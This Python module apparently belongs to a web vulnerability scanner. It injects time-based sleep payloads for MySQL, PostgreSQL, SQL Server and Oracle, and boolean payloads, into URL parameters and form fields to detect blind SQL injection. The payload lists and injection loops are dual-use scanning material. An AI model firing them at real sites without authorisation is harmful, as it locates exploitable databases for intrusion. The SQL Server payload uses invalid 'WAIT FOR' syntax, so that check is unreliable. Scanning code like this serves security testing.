from utils import dict_iterate, update_url_params, modify_parameter, get_url_host, get_url_query, compare
from client import NotAPage, RedirectedToExternal

#(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/
TIME_INJECTIONS = {
    "MySQL": ("(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/", "if(now()=sysdate(),sleep({0}),0)/*'XOR(if(now()=sysdate(),sleep({0}),0))OR'\"XOR(if(now()=sysdate(),sleep({0}),0))OR\"*/",),
    "PostgreSQL": (";SELECT pg_sleep({0})--", ");SELECT pg_sleep({0})--", "';SELECT pg_sleep({0})--", "');SELECT pg_sleep({0})--", "));SELECT pg_sleep({0})--", "'));SELECT pg_sleep({0})--", "SELECT pg_sleep({0})--"),
    "Microsoft SQL Server": ("; WAIT FOR DELAY '00:00:{0}'",),
    "Oracle": ("BEGIN DBMS_LOCK.SLEEP({0}); END;",),
}

BOOLEAN_INJECTIONS = {
    " AND 3*2*1=6 AND 119=119": True,
    " AND 3*2*2=6 AND 119=119": False,
    " AND 3*2*1=6 AND 119=118": False,
    " AND 5*4=20 AND 119=119": True,
    " AND 5*4=21 AND 119=119": False,
    " AND 7*7>48 AND 119=119": True
}

BOOL_TEST_COUNT = len(BOOLEAN_INJECTIONS)

def sql_blind(page, client):
    # print("Testing for SQL Blind in page {}".format(page.url))

    if page.parsed_url.query:
        time_based_blind_url(client, page.url)
        boolean_blind(client, page)

    for form in page.get_forms():
        if get_url_host(page.url) != get_url_host(form.action):
            continue

        time_based_blind_form(client, form)


def boolean_blind(client, page):
    page_content = list(page.document.stripped_strings)
    query = get_url_query(page.url)

    for param, value in dict_iterate(query):
        successed = 0
        for payload, is_correct in dict_iterate(BOOLEAN_INJECTIONS):
            injected_action = update_url_params(page.url, {param: value + payload})
            try:
                res_page = client.get(injected_action)
                if is_correct == compare(page_content, list(res_page.document.stripped_strings)):
                    successed += 1
            except NotAPage:
                continue
            except RedirectedToExternal:
                continue

        if successed == BOOL_TEST_COUNT:
            print('SQL blind (boolean) in param {}'.format(param))

def time_based_blind_url(client, url):
    query = get_url_query(url)

    for param, value in dict_iterate(query):
        for db, injections in dict_iterate(TIME_INJECTIONS):
            for inj in injections:
                successed = []
                for t in range(0, 10, 3):
                    payload = inj.format(t)
                    injected_url = update_url_params(url, {param: payload})

                    try:
                        req_time = client.get(injected_url).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                if successed and all(t <= rt for t, rt in successed):
                    print('SQL blind db {} in form {} param {} injection {}'.format(db, url, param, payload))

def time_based_blind_form(client, form):
    form_parameters = dict(form.get_parameters())

    query = get_url_query(form.action)

    for param, value in dict_iterate(query):
        for db, injections in dict_iterate(TIME_INJECTIONS):
            for inj in injections:
                successed = []
                for t in range(0, 10, 3):
                    payload = inj.format(t)
                    injected_action = update_url_params(form.action, {param: payload})

                    try:
                        req_time = form.send(client, form_parameters, changed_action=injected_action).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                if successed and all(t <= rt for t, rt in successed):
                    print('SQL blind db {} in form {} param {} injection {}'.format(db, form.action, param, payload))


    for param in form_parameters:
        for db, injections in dict_iterate(TIME_INJECTIONS):
            for inj in injections:
                successed = []
                for t in range(0, 10, 3):
                    payload = inj.format(t)
                    injected_params = modify_parameter(form_parameters, param, payload)

                    try:
                        req_time = form.send(client, injected_params).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                if successed and all(t <= rt for t, rt in successed):
                    print('SQL blind db {} in form {} param {} injection {}'.format(db, form.action, param, payload))
